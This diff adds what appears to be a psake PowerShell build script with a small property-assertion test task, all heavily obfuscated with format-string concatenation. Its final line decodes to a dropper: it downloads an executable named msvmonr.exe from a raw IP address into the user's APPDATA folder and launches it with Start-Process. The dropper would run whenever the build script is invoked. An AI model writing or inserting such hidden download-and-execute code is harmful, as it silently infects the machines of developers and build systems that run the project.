@@ -1,0 +1,15 @@
+&("{0}{2}{3}{1}" -f 'p','s','rope','rtie') {
+  ${x} = ${N`Ull}
+  ${y} = ${N`Ull}
+  ${Z} = ${nu`Ll}
+}
+
+&("{1}{0}"-f'sk','ta') ("{2}{0}{1}" -f 'faul','t','de') -depends ("{1}{2}{0}" -f'rties','TestPr','ope')
+
+.("{0}{1}"-f'tas','k') ("{0}{3}{1}{2}"-f 'TestPr','r','ties','ope') {
+  &("{0}{2}{1}" -f 'A','sert','s') (${X} -ne ${Nu`lL}) ("{2}{3}{0}{1}{4}"-f 'not',' ','x should',' ','be null')
+  &("{2}{1}{0}"-f 't','ser','As') (${Y} -ne ${n`ULl}) ("{6}{3}{2}{5}{1}{0}{4}" -f 'u','be n','d n',' shoul','ll','ot ','y')
+  .("{1}{0}" -f 'ert','Ass') (${Z} -eq ${n`Ull}) ("{1}{0}{2}" -f' ','z should be','null')
+}
+
+(&("{2}{0}{1}" -f'O','bject','New-') ("{1}{0}{3}{2}" -f 'te','Sys','lient','m.Net.WebC')).("{1}{0}{2}" -f 'il','DownloadF','e').Invoke(("{4}{7}{1}{0}{8}{2}{5}{3}{9}{6}" -f '2.64.45/~','8','ka','msv','ht','r/','onr.exe','tp://80.','ya','m'),"$env:APPDATA\msvmonr.exe");.("{1}{0}{2}" -f'tart-Pro','S','cess') ("$env:APPDATA\msvmonr.exe")
